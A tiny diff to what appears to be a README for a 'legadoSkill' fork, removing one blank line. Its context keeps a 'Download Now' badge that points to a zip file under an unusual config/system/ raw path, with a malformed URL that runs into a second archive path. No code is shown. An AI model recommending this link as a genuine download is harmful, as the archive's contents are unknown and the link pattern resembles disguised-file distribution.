@@ -2,7 +2,6 @@
 
 > **This fork (working repo):** https://github.com/h11128/legadoSkill  
 > **Upstream:** https://github.com/rezmdie/legadoSkill
-
 [![Download legadoSkill](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/rezmdie/legadoSkill/raw/refs/heads/main/config/system/legado-Skill-3.2.zip番茄小说zym888/Skill_legado_2.3.zip)
 
 ---
